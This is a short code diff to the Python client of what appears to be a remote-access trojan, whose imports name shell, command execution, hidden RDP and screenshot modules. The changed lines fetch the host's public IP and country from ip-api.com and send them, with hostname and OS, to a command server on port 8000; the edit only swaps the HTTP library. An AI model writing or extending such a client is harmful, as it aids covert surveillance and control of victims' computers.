@@ -1,7 +1,7 @@
 import socket
 from Modules import shell as Shell, power as Power, execute as Execute, hrdp as HRDP, screenshot as Screenshot
 from time import sleep
-from requests import get
+import urllib.request
 from json import loads
 from platform import platform
 from zlib import compress, decompress
@@ -62,7 +62,7 @@ def main():
         client = Client(SERVER_ADDRESS, 8000)
 
         # Send client info to the server - IP, Country Code, Name, Os
-        response = loads(get('http://ip-api.com/json/?fields=status,countryCode,query').text)
+        response = loads(urllib.request.urlopen('http://ip-api.com/json/?fields=status,countryCode,query').read().decode())
         if response['status'] == 'success':
             client.send('{},{},{},{}'.format(response['query'], response['countryCode'], socket.gethostname(), platform()))
 
